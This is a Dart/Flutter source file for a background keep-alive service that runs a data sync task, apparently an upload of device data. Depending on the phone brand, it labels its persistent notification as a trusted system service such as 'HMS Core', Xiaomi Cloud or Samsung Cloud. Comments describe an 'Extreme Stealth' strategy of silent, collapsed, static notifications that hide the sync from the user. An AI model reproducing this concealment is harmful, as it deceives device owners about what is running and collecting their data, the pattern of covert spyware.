import 'dart:async';
import 'dart:io';
import 'dart:ui';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import '../core/config/app_config.dart';
import '../core/di/service_locator.dart';
import '../domain/usecases/sync_data_use_case.dart';

@pragma('vm:entry-point')
class BackgroundServiceStarter {
  static Future<void> initializeService() async {
    final service = FlutterBackgroundService();

    // 根据品牌动态调整通知文案
    String channelName = '系统服务';
    String notificationTitle = '系统服务';
    String notificationContent = '正在进行系统优化';

    if (Platform.isAndroid) {
      final androidInfo = await DeviceInfoPlugin().androidInfo;
      final brand = androidInfo.brand.toLowerCase();
      if (brand.contains('huawei') || brand.contains('honor')) {
        channelName = 'HMS Core 基础服务';
        notificationTitle = 'HMS Core';
        notificationContent = '正在同步系统数据';
      } else if (brand.contains('xiaomi')) {
        channelName = '小米云服务';
        notificationTitle = '小米云服务';
        notificationContent = '正在备份系统设置';
      } else if (brand.contains('oppo') || brand.contains('vivo')) {
        channelName = '系统账号服务';
        notificationTitle = '账号服务';
        notificationContent = '正在优化系统性能';
      } else if (brand.contains('samsung')) {
        channelName = 'Samsung Cloud';
        notificationTitle = 'Samsung Cloud';
        notificationContent = 'Synchronizing data...';
      }
    }

    // Android Notification Channel setup
    // 2026 Refactor: Use MIN importance to minimize visual intrusion
    // 适配Android 9+及国内ROM，必须有Channel，但可以设为静音和折叠
    final AndroidNotificationChannel channel = AndroidNotificationChannel(
      'system_service', // id
      channelName, // title
      description: '运行系统必要的后台任务', // description
      importance: Importance.min, // MIN importance: silent and collapsed
    );

    final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
        FlutterLocalNotificationsPlugin();

    if (Platform.isIOS || Platform.isAndroid) {
      await flutterLocalNotificationsPlugin
          .resolvePlatformSpecificImplementation<
            AndroidFlutterLocalNotificationsPlugin
          >()
          ?.createNotificationChannel(channel);
    }

    await service.configure(
      androidConfiguration: AndroidConfiguration(
        // This will be executed when app is in foreground or background in separated isolate
        onStart: onStart,

        // auto start service
        autoStart: false,
        isForegroundMode: true,

        notificationChannelId: 'system_service',
        initialNotificationTitle: notificationTitle,
        initialNotificationContent: notificationContent,
        foregroundServiceNotificationId: 888,
      ),
      iosConfiguration: IosConfiguration(
        // auto start service
        autoStart: false,
        // this will be executed when app is in foreground in separated isolate
        onForeground: onStart,
        // you have to enable background fetch capability on xcode project
        onBackground: onIosBackground,
      ),
    );
  }

  // 2026 Refactor: Removed proactive battery optimization request to comply with strict permission flow
  // static Future<void> requestIgnoreBatteryOptimizations() async {
  //   if (Platform.isAndroid) {
  //     var status = await Permission.ignoreBatteryOptimizations.status;
  //     if (!status.isGranted) {
  //       await Permission.ignoreBatteryOptimizations.request();
  //     }
  //   }
  // }

  @pragma('vm:entry-point')
  static Future<bool> onIosBackground(ServiceInstance service) async {
    // iOS 13+ Background Processing
    // 注意：iOS后台执行时间非常有限(约30秒)。
    // 真正的长时后台上传在iOS上非常困难，通常需要使用 `background_downloader` 插件的 URLSessionConfiguration.background
    // 或者申请后台位置权限(不推荐滥用)。
    // 此处仅做简单保活，尽量争取时间。

    return true;
  }

  @pragma('vm:entry-point')
  static void onStart(ServiceInstance service) async {
    // Only available for flutter 3.0.0 and later
    DartPluginRegistrant.ensureInitialized();

    final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
        FlutterLocalNotificationsPlugin();

    // Initialize notifications
    const AndroidInitializationSettings initializationSettingsAndroid =
        AndroidInitializationSettings('@mipmap/ic_launcher');
    final InitializationSettings initializationSettings =
        InitializationSettings(android: initializationSettingsAndroid);
    await flutterLocalNotificationsPlugin.initialize(initializationSettings);

    // 立即发送一个更新，告知 UI 服务已启动
    service.invoke('update', {"message": "后台保活服务已就绪"});

    // 2026 Refactor: 将同步逻辑集成至后台服务
    // 在独立 Isolate 中初始化 ServiceLocator
    await AppConfig.load();
    await setupServiceLocator();

    // 监听前端发来的开始同步指令，或者直接自动开始
    service.on('startSync').listen((event) async {
      try {
        await getIt<SyncDataUseCase>().execute(
          onProgress: (msg) {
            // 2026 Refactor: 极致隐藏。仅通过消息通道更新 UI，不再变动通知栏
            service.invoke('update', {"message": msg});
          },
        );
      } catch (e) {
        service.invoke('update', {"message": "同步异常: $e"});
      }
    });

    // Listen for stop event
    service.on('stopService').listen((event) {
      service.stopSelf();
    });

    // 2026 Refactor: Passive Keep-Alive Mode (Extreme Stealth)
    // 任务由前台 UI Isolate 执行，后台服务仅作为 "Foreground Service" 锚点防止 App 被杀
    //
    // 极限隐形策略：
    // 1. Importance.min (无声、无震动、折叠)
    // 2. 静态内容 (避免进度更新导致的闪烁)

    // 不再监听 setNotification，保持通知内容静态化
    // service.on('setNotification').listen((event) async { ... });

    // 定时器保活 (Heartbeat)
    // 防止某些激进的 ROM 认为服务空闲而杀掉
    Timer.periodic(const Duration(seconds: 30), (timer) async {
      service.invoke('update', {"heartbeat": DateTime.now().toIso8601String()});
    });
  }
}
